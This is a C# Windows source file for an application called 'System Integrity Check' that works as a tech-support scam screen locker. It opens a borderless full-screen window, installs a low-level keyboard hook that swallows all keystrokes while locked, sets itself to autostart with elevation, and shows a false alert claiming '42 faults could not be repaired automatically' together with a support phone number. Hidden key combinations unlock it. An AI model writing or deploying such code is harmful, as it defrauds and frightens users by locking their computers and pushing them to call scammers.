using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Web.WebView2.WinForms;

namespace ScanApp
{
    internal static class Program
    {
        private const string DefaultPhone = "1-774-776-6819";
        private const string ConfigFileName = "support.txt";

        private static string _phone = DefaultPhone;
        private static NotifyIcon _tray;
        private static Form _form;
        private static WebView2 _web;
        private static bool _notified;
        private static bool _restarting;

        // ---- keyboard lock ----
        private static bool _locked = true;
        private static bool _spaceDown;
        private static bool _uDown;
        private static LowLevelKeyboardProc _hookProc;
        private static IntPtr _hookId = IntPtr.Zero;

        [STAThread]
        private static void Main(string[] args)
        {
            if (HasArg(args, "--uninstall-autostart"))
            {
                if (!Autostart.IsAdmin() && Autostart.RelaunchElevated("--uninstall-autostart")) return;
                Autostart.Uninstall();
                return;
            }

            if (Autostart.EnsureInstalled()) return;   // elevating, let the new instance take over

            Application.SetHighDpiMode(HighDpiMode.PerMonitorV2);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            _phone = LoadPhone();

            _form = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                StartPosition = FormStartPosition.Manual,
                Bounds = Screen.PrimaryScreen.Bounds,
                WindowState = FormWindowState.Maximized,
                BackColor = Color.FromArgb(0, 120, 215),
                Text = "System Integrity Check",
                KeyPreview = true
            };

            _web = new WebView2 { Dock = DockStyle.Fill };
            _form.Controls.Add(_web);

            BuildTray();

            _form.FormClosing += (s, e) =>
            {
                Unhook();
                if (_tray != null) { _tray.Visible = false; _tray.Dispose(); }
                if (!_restarting) Autostart.OnExit();
            };

            _form.Shown += async (s, e) =>
            {
                await _web.EnsureCoreWebView2Async();
                var cfg = _web.CoreWebView2.Settings;
                cfg.AreDefaultContextMenusEnabled = false;
                cfg.AreDevToolsEnabled = false;
                cfg.IsStatusBarEnabled = false;
                cfg.IsZoomControlEnabled = false;
                cfg.AreBrowserAcceleratorKeysEnabled = false;

                _web.CoreWebView2.WebMessageReceived += (ms, me) =>
                {
                    string msg;
                    try { msg = me.TryGetWebMessageAsString(); } catch { return; }
                    if (msg == "scan-complete") ShowAlert();
                };

                string html;
                using (var stream = typeof(Program).Assembly.GetManifestResourceStream("ScanApp.index.html"))
                using (var reader = new StreamReader(stream))
                    html = reader.ReadToEnd().Replace("{{PHONE}}", _phone);

                _web.NavigateToString(html);

                Hook();   // install the lock once the page is up
            };

            Application.Run(_form);
        }

        // ================= keyboard lock =================

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int VK_CONTROL = 0x11;
        private const int VK_SHIFT = 0x10;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern short GetKeyState(int nVirtKey);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static void Hook()
        {
            if (_hookId != IntPtr.Zero) return;
            _hookProc = HookCallback;   // strong reference or the GC collects it
            _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(null), 0);
        }

        private static void Unhook()
        {
            if (_hookId == IntPtr.Zero) return;
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
            _hookProc = null;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = wParam.ToInt32();
                int vk = Marshal.ReadInt32(lParam);      // vkCode is the first field
                bool down = msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN;
                bool up = msg == WM_KEYUP || msg == WM_SYSKEYUP;

                bool ctrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
                bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

                // admin shortcuts, always available
                if (down && ctrl && shift)
                {
                    if (vk == (int)Keys.Q) { _form.BeginInvoke(new Action(() => _form.Close())); return (IntPtr)1; }
                    if (vk == (int)Keys.R) { _form.BeginInvoke(new Action(() => _web.Reload())); return (IntPtr)1; }
                }

                if (vk == (int)Keys.Space)
                {
                    if (down) _spaceDown = true;
                    if (up) _spaceDown = false;
                }
                else if (vk == (int)Keys.U)
                {
                    if (down && _spaceDown && !_uDown)
                    {
                        _uDown = true;
                        ToggleLock();
                        _spaceDown = false;
                        return (IntPtr)1;
                    }
                    if (up) _uDown = false;
                }

                if (_locked) return (IntPtr)1;   // swallow everything
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static void ToggleLock()
        {
            _locked = !_locked;
            try
            {
                _web?.CoreWebView2?.PostWebMessageAsJson(
                    "{\"type\":\"lock\",\"locked\":" + (_locked ? "true" : "false") + "}");
            }
            catch { }
        }

        // ================= tray / phone =================

        private static string LoadPhone()
        {
            try
            {
                var path = Path.Combine(AppContext.BaseDirectory, ConfigFileName);
                if (File.Exists(path))
                {
                    var text = File.ReadAllText(path).Trim();
                    if (text.Length > 0) return text;
                }
            }
            catch { }
            return DefaultPhone;
        }

        private static void BuildTray()
        {
            _tray = new NotifyIcon
            {
                Icon = SystemIcons.Error,
                Text = "System Integrity Check",
                Visible = true
            };

            var menu = new ContextMenuStrip();
            menu.Items.Add("Show support number", null, (s, e) => ShowNumber());
            menu.Items.Add("Copy number", null, (s, e) => CopyNumber());
            menu.Items.Add(new ToolStripSeparator());
            menu.Items.Add("Restart scan", null, (s, e) => RestartScan());
            menu.Items.Add("Exit", null, (s, e) => _form.Close());
            menu.Items.Add("Exit and disable autostart", null, (s, e) => ExitAndDisable());

            _tray.ContextMenuStrip = menu;
            _tray.BalloonTipClicked += (s, e) => ShowNumber();
        }

        private static bool HasArg(string[] args, string flag)
        {
            if (args == null) return false;
            foreach (var a in args)
                if (string.Equals(a, flag, StringComparison.OrdinalIgnoreCase)) return true;
            return false;
        }

        private static void RestartScan()
        {
            _restarting = true;
            try
            {
                Process.Start(new ProcessStartInfo(Environment.ProcessPath)
                {
                    UseShellExecute = true,
                    WorkingDirectory = AppContext.BaseDirectory
                });
            }
            catch { }
            _form.Close();
        }

        private static void ExitAndDisable()
        {
            if (!Autostart.IsAdmin() && Autostart.RelaunchElevated("--uninstall-autostart"))
            {
                _form.Close();
                return;
            }
            Autostart.Uninstall();
            _form.Close();
        }

        private static void ShowAlert()
        {
            if (_notified) return;
            _notified = true;

            _tray.BalloonTipTitle = "System Integrity Check";
            _tray.BalloonTipText = "42 faults could not be repaired automatically. Call support: " + _phone;
            _tray.BalloonTipIcon = ToolTipIcon.Error;
            _tray.ShowBalloonTip(10000);
        }

        private static void CopyNumber()
        {
            try { Clipboard.SetText(_phone); } catch { }
        }

        private static void ShowNumber()
        {
            CopyNumber();
            MessageBox.Show(_form,
                "Support number (copied to clipboard):\n\n" + _phone,
                "Support", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
